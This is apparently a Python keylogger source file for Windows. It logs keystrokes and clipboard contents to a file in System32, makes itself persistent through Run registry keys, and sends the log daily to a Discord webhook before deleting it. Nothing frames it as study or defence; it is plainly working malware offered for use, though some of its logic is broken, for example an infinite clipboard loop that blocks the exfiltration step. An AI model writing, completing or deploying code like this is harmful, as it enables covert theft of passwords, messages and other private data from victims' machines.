import os
import sys
import time
import keyboard
import pyautogui
import requests
import winreg as reg
import shutil

# Set the webhook URL for Discord
webhook_url = "YOUR_DISCORD_WEBHOOK_URL"

# Set the path to save the logged keypresses
log_path = "C:\\Windows\\System32\\discord.txt"

# Move the script to the C:\ directory
script_path = sys.argv[0]
if not script_path.startswith("C:\\"):
    shutil.move(script_path, "C:\\")
    script_path = "C:\\" + os.path.basename(script_path)
    os.system('cmd /c "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v keylogger /t REG_SZ /d {}"'.format(script_path))

# Initialize the keylogger
def keylogger(event):
    with open(log_path, "a") as file:
        file.write(event.name)
        file.write("\n")

# Initialize the clipboard logger
def clipboard_logger():
    while True:
        clipboard_content = pyautogui.paste()

        if clipboard_content != "":
            with open(log_path, "a") as file:
                file.write(clipboard_content)
                file.write("\n")

        time.sleep(1)

# Send the logged keypresses to Discord using the webhook
def send_to_discord():
    with open(log_path, "r") as file:
        content = file.read()

    payload = {
        "content": content
    }

    try:
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            os.remove(log_path)  # Remove the log file if successfully sent to Discord
    except:
        pass
# Add the keylogger to the Windows Registry
def add_to_registry():
    key = reg.HKEY_LOCAL_MACHINE
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as regkey:
        reg.SetValueEx(regkey, "Keylogger", 0, reg.REG_SZ, sys.executable + ' "C:\\>"')
        
# Start the keylogger
keyboard.on_release(keylogger)

# Start the clipboard logger
clipboard_logger()

# Schedule sending the logged keypresses to Discord once a day
while True:
    send_to_discord()
    time.sleep(86400)  # 24 hours
